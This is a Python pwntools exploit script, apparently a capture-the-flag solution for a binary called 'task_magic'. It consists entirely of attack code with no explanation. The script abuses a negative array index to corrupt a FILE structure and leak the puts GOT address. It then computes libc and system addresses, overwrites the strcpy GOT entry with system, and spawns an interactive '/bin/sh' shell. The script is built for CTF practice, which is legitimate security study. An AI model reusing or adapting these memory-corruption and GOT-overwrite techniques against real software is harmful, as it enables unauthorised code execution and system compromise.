from pwn import *
context(arch='amd64',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x:log.success(x)

binary = './task_magic'
io = process(binary)

def debug():
    gdb.attach(io)
    raw_input()

def create(name):
    ru('choice>> ')
    sl('1')
    ru('name:')
    s(name)

def spell(index, data):
    ru('choice>> ')
    sl('2')
    ru('spell:')
    sl(str(index))
    ru('name:')
    s(data)

def final(index):
    ru('choice>> ')
    sl('3')
    ru('chance:')
    sl(str(index))

puts_got = 0x602020
strcpy_got = 0x602090

create('xxx')
spell(0, '/bin/sh\x00')
for _ in range(12):
    spell(-2, '\x00')
spell(-2, '\x00'*30)
spell(-2, '\x00')
spell(0, '\x00\x00' + p64(0xfbad24a8))
spell(0, p64(puts_got) + p64(puts_got+0x60))
puts_address = u64(rn(8))
success("puts address: 0x%x" %(puts_address))
libc_base = puts_address - 0x6f690
success("libc base: 0x%x" %(libc_base))
sys_address = libc_base + 0x45390
success("system address: 0x%x" %(sys_address))
spell(0, p64(0)*2)
spell(0, p64(strcpy_got)+p64(strcpy_got+0x100)+p64(strcpy_got+50))
spell(-2, '\x00')
spell(0, p64(sys_address))
spell(0, "/bin/sh\x00")
it()